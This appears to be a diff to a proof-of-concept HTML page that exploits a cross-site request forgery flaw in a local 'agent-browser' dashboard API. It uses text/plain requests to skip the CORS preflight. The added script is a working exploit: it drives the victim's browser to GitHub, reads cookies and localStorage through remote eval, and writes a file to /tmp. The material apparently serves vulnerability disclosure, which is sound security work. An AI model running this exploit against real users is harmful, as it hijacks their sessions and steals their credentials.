@@ -1,13 +1,52 @@
 <!doctype html>
-<script>
-const exec = (args) => fetch("http://127.0.0.1:4848/api/exec", {
-  method: "POST",
-  headers: { "Content-Type": "text/plain" },  // simple CORS, no preflight
-  body: JSON.stringify({ args })
-}).then(r => r.text()).then(console.log).catch(console.error);
+<html>
+<head><title>PoC - agent-browser CSRF RCE</title></head>
+<body>
+<h2>agent-browser Dashboard CSRF PoC</h2>
+<pre id="output">Running...</pre>
 
-// Benign test: just print version info
-exec(["--version"]);
-// Benign test: list sessions
-exec(["sessions", "list"]);
+<script>
+const BASE = "http://127.0.0.1:4848/api/exec";
+const H = { "Content-Type": "text/plain" };
+const log = (msg) => document.getElementById("output").innerText += "\n" + msg;
+
+const exec = async (args) => {
+  const r = await fetch(BASE, {
+    method: "POST",
+    headers: H,  // text/plain = simple CORS, no preflight needed
+    body: JSON.stringify({ args })
+  });
+  return r.json();
+};
+
+(async () => {
+  // Step 1: Navigate victim's browser to GitHub
+  log("[*] Opening GitHub in victim browser...");
+  const open = await exec(["open", "https://github.com"]);
+  log("[+] open: " + JSON.stringify(open.stdout));
+
+  // Step 2: Wait for page load
+  await new Promise(r => setTimeout(r, 3000));
+
+  // Step 3: Steal cookies
+  log("[*] Stealing cookies...");
+  const cookies = await exec(["eval", "document.cookie"]);
+  log("[+] COOKIES: " + JSON.stringify(cookies.stdout));
+
+  // Step 4: Steal localStorage
+  log("[*] Stealing localStorage...");
+  const storage = await exec(["eval", 
+    "JSON.stringify(Object.fromEntries(Object.entries(localStorage)))"
+  ]);
+  log("[+] LOCALSTORAGE: " + JSON.stringify(storage.stdout));
+
+  // Step 5: Write file to victim filesystem
+  log("[*] Writing file to /tmp/pwned.png ...");
+  const shot = await exec(["screenshot", "/tmp/pwned.png"]);
+  log("[+] file write: " + JSON.stringify(shot.stdout));
+
+  log("\n[!] DONE - all impacts demonstrated");
+})();
 </script>
+</body>
+</html>
